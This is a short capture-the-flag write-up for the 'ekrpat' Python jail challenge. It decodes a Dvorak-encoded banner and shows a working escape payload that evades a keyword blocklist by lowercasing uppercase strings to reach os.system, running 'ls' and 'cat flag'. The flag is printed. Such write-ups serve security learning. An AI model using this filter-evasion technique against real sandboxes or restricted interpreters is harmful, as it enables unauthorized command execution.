# erkpat

>I made so few errors when creating this jail.
>
>nc 34.72.64.224 8083
>
>nc 35.231.20.75 8083
>
>Created by Thomas (Seltzerz #6678)

>### Hint
>Look down at where you're typing.

---

## Connect to the server

```bash
inho@xps15:~/Desktop$ nc 34.72.64.224 8083
Frg-k. xprt.b mf jre.! >ojal. ,cydrgy yd. d.nl ru .kanw .q.jw cmlrpyw rl.bw row p.aew ofoy.mw abe ,pcy.v Ucpoyw .by.p -ekrpat-v Frg ,cnn yd.b i.y abryd.p cblgy ,dcjd frg jab go. ypf yr xp.at rgy ru yd. hacnv
>>>
```

dvorak
http://wbic16.xedoloh.com/dvorak.html


Convert `To QWERTY` :

```
You've broken my code! Escape without the help of eval, exec, import, open, os, read, system, and write. First, enter 'dvorak'. You will then get another input which you can use try to break out of the jail.
```


## ls

```bash
inho@xps15:~/Desktop$ nc 34.72.64.224 8083
Frg-k. xprt.b mf jre.! >ojal. ,cydrgy yd. d.nl ru .kanw .q.jw cmlrpyw rl.bw row p.aew ofoy.mw abe ,pcy.v Ucpoyw .by.p -ekrpat-v Frg ,cnn yd.b i.y abryd.p cblgy ,dcjd frg jab go. ypf yr xp.at rgy ru yd. hacnv
>>> dvorak
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls')
Dockerfile
ekrpat.py
flag
ojal.
ynetd
Dockerfile

```


## cat flag
```bash
inho@xps15:~/Desktop$ nc 34.72.64.224 8083
Frg-k. xprt.b mf jre.! >ojal. ,cydrgy yd. d.nl ru .kanw .q.jw cmlrpyw rl.bw row p.aew ofoy.mw abe ,pcy.v Ucpoyw .by.p -ekrpat-v Frg ,cnn yd.b i.y abryd.p cblgy ,dcjd frg jab go. ypf yr xp.at rgy ru yd. hacnv
>>> dvorak
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat flag')
UMASS{dvorak_rules}

```

`UMASS{dvorak_rules}`

## Reference

https://anee.me/escaping-python-jails-849c65cf306e
